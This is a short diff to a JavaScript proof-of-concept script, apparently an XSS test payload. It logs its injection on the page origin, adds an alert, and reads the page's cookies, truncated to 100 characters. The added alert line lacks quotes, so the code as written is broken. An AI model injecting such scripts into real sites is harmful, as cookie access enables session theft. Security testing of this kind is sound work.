@@ -1,6 +1,6 @@
 (function () {
   console.log("[POC] Injected script executed on:", location.origin);
-
+  alert(POC EXECUTED);
   // 1. Show cookie access (truncate for safety)
   const cookies = document.cookie ? document.cookie.slice(0, 100) : "No cookies";
 
